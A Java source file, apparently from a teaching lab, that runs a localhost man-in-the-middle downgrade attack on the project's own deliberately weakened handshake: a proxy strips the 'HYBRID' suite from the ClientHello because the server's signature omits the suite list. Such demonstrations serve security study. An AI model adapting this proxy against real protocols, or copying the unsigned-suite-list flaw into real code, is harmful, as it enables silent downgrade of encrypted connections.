package com.pqcaps.attacklab;

import com.pqcaps.classical.ClassicalCryptoSuite;
import com.pqcaps.classical.ClassicalHandshake;
import com.pqcaps.classical.ClassicalHandshake.HandshakeOutcome;
import com.pqcaps.classical.ClassicalSecureChannel;
import com.pqcaps.common.ClientHello;
import com.pqcaps.common.HandshakeConfig;
import com.pqcaps.common.ServerHello;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.KeyPair;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * ATTACK 1: Cipher Suite Downgrade Attack (exploits VULN-1).
 *
 * <p><b>The Weakness</b>: In Phase 1, the server's signature does NOT bind the
 * client's proposed suite list ({@code HandshakeConfig.skipSuiteSignature = true}).
 *
 * <p><b>The Attack</b>: An on-path TCP proxy intercepts {@link ClientHello},
 * strips post-quantum / high-security suites (e.g. "HYBRID") from the list,
 * leaving only weaker suites (e.g. "CLASSICAL"). Because the suite list was omitted
 * from the signed transcript, the server signs and the client verifies the transcript
 * without noticing the deletion.
 *
 * <p><b>Output</b>:
 * <pre>
 * BEFORE: [HYBRID, CLASSICAL]  AFTER: [CLASSICAL]  Handshake accepted: true
 * </pre>
 */
public final class DowngradeAttack {

    private static final String LOCALHOST = "127.0.0.1";

    public static void main(String[] args) {
        System.out.println("======================================================================");
        System.out.println("  ATTACK 1: Cipher Suite Downgrade Attack (exploiting VULN-1)");
        System.out.println("======================================================================");

        AttackResult result = execute(true);
        System.out.println();
        System.out.println("Attack Success : " + result.success());
        System.out.println("Vulnerability  : " + result.vulnerabilityId());
        System.out.println("Evidence       : " + result.evidence());
    }

    /**
     * Executes the downgrade attack.
     *
     * @param vulnerable if true, uses VULN-1 (skipSuiteSignature=true);
     *                   if false, uses safe mode (skipSuiteSignature=false).
     * @return the AttackResult summarizing the attempt.
     */
    public static AttackResult execute(boolean vulnerable) {
        ensureLocalhost();
        HandshakeConfig config = vulnerable ? HandshakeConfig.vulnerable() : HandshakeConfig.safe();
        KeyPair serverIdentity = ClassicalCryptoSuite.getInstance().signatureScheme().generateKeyPair();

        AtomicReference<String> beforeSuites = new AtomicReference<>();
        AtomicReference<String> afterSuites = new AtomicReference<>();
        AtomicBoolean handshakeAccepted = new AtomicBoolean(false);
        AtomicReference<String> negotiatedSuite = new AtomicReference<>();
        AtomicReference<String> failureReason = new AtomicReference<>();

        CountDownLatch serverReady = new CountDownLatch(1);
        CountDownLatch proxyReady = new CountDownLatch(1);
        int[] ports = new int[2]; // [0]=serverPort, [1]=proxyPort

        // ── 1. Target Server Thread ──────────────────────────────────────────
        Thread serverThread = new Thread(() -> {
            try (ServerSocket ss = new ServerSocket(0, 50, java.net.InetAddress.getByName(LOCALHOST))) {
                ports[0] = ss.getLocalPort();
                serverReady.countDown();

                try (Socket clientConn = ss.accept()) {
                    HandshakeOutcome outcome = ClassicalHandshake.serverHandshakeFull(clientConn, config, serverIdentity);
                    negotiatedSuite.set(outcome.chosenSuite());
                }
            } catch (Exception e) {
                // Expected if client aborts on safe mode
            }
        }, "downgrade-server");
        serverThread.setDaemon(true);
        serverThread.start();

        // ── 2. Attacker Proxy Thread ──────────────────────────────────────────
        Thread proxyThread = new Thread(() -> {
            try {
                serverReady.await();
                try (ServerSocket proxySs = new ServerSocket(0, 50, java.net.InetAddress.getByName(LOCALHOST))) {
                    ports[1] = proxySs.getLocalPort();
                    proxyReady.countDown();

                    try (Socket clientSocket = proxySs.accept();
                         Socket serverSocket = new Socket(LOCALHOST, ports[0])) {

                        ObjectOutputStream serverOut = new ObjectOutputStream(serverSocket.getOutputStream());
                        serverOut.flush();
                        ObjectInputStream serverIn = new ObjectInputStream(serverSocket.getInputStream());

                        ObjectInputStream clientIn = new ObjectInputStream(clientSocket.getInputStream());
                        ObjectOutputStream clientOut = new ObjectOutputStream(clientSocket.getOutputStream());
                        clientOut.flush();

                        // Read ClientHello from client
                        ClientHello origHello = (ClientHello) clientIn.readObject();
                        beforeSuites.set(origHello.suites().toString());

                        // TAMPER: Strip "HYBRID" (or higher security suites) to downgrade to CLASSICAL
                        List<String> downgradedList = new ArrayList<>(origHello.suites());
                        downgradedList.remove("HYBRID");
                        if (downgradedList.isEmpty()) {
                            downgradedList.add("CLASSICAL");
                        }
                        afterSuites.set(downgradedList.toString());

                        ClientHello modifiedHello = new ClientHello(
                                origHello.xpk_c(),
                                downgradedList,
                                origHello.nonce_c()
                        );

                        // Forward modified ClientHello to Server
                        serverOut.writeObject(modifiedHello);
                        serverOut.flush();

                        // Read ServerHello from Server and forward to Client
                        ServerHello sh = (ServerHello) serverIn.readObject();
                        clientOut.writeObject(sh);
                        clientOut.flush();
                    }
                }
            } catch (Exception e) {
                // Connection closed or aborted
            }
        }, "downgrade-proxy");
        proxyThread.setDaemon(true);
        proxyThread.start();

        // ── 3. Client Execution ──────────────────────────────────────────────
        try {
            proxyReady.await();
            try (Socket socket = new Socket(LOCALHOST, ports[1])) {
                List<String> clientOffered = List.of("HYBRID", "CLASSICAL");
                // Client connects with pinning active so signature verification runs
                HandshakeOutcome outcome = ClassicalHandshake.clientHandshakeFull(
                        socket,
                        config.withSkipKeyPinning(false), // enforce signature verification!
                        serverIdentity.getPublic(),
                        clientOffered
                );
                handshakeAccepted.set(true);
                negotiatedSuite.set(outcome.chosenSuite());
            }
        } catch (SecurityException se) {
            failureReason.set("Client rejected signature: " + se.getMessage());
        } catch (Exception e) {
            failureReason.set(e.getMessage());
        }

        try {
            serverThread.join(3000);
            proxyThread.join(3000);
        } catch (InterruptedException ignored) {}

        String line = String.format("BEFORE: %s  AFTER: %s  Handshake accepted: %b",
                beforeSuites.get(), afterSuites.get(), handshakeAccepted.get());
        System.out.println(line);

        boolean attackSuccess = handshakeAccepted.get() && "CLASSICAL".equals(negotiatedSuite.get());
        String evidence = attackSuccess
                ? line + " | Negotiated suite downgraded silently to " + negotiatedSuite.get()
                : "Handshake rejected as expected. " + failureReason.get();

        return new AttackResult(
                "Downgrade Attack",
                attackSuccess,
                evidence,
                "VULN-1"
        );
    }

    private static void ensureLocalhost() {
        if (!"127.0.0.1".equals(LOCALHOST)) {
            throw new SecurityException("Localhost only: 127.0.0.1 required!");
        }
    }
}
